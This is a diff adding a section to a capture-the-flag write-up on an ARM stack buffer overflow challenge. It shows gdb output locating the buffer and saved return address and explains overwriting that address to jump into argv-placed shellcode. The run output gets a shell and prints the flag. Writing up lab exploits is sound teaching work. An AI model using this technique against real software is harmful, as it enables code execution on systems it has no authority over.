@@ -350,6 +350,51 @@ The problem statement is below.
 The program wipes envp. Can you put your shellcode on the stack and execute that?
 ```
 
+Let's debug the program first.
+
+The input buffer starts with `0xfffef0a4`.
+
+```gdb
+read@plt (
+   $r0 = 0x000000,
+   $r1 = 0xfffef0a4 → 0x0000000f,
+   $r2 = 0x000014
+)
+```
+
+And the return address is `0xfffef0ac`.
+
+```gdb
+gef➤  info frame
+Stack level 0, frame at 0xfffef0b0:
+ pc = 0x10518 in input_func; saved pc = 0x105a4
+ called by frame at 0xfffef0d8
+ Arglist at 0xfffef098, args:
+ Locals at 0xfffef098, Previous frame's sp is 0xfffef0b0
+ Saved registers:
+  lr at 0xfffef0ac
+```
+
+The difference is 8, so input `8 bytes` and `an address to overwrite return address`.
+
+The question is this program eradicate environmental variables. Instead of using an environmental variable, you are unable to use stdin too. What else can we use? It's the arguments.
+
+We execute it with an argument, and input will be `{nop sled} + {argument address}`.
+
+How do we find the starting address of the argument?
+
+Just like `6-stack-ovfl-use-envp-arm`, first crash program with an argument and find the address using `gdb`. It is on the stack, so use `x/1000s $sp` in gdb to get it.
+
+```bash
+TXK220008@ctf-vm3:~/unit2/7-stack-ovfl-no-envp-arm $ ./solve7.py
+[+] Starting local process './7-stack-ovfl-no-envp-arm': pid 789253
+b'Please type your name: \n'
+b'Hello \n'
+[*] Switching to interactive mode
+$ cat flag
+candl{n0_ENVP_th1$_t1m3}
+```
+
 ## 8-rop0-arm
 
 The problem statement is below.
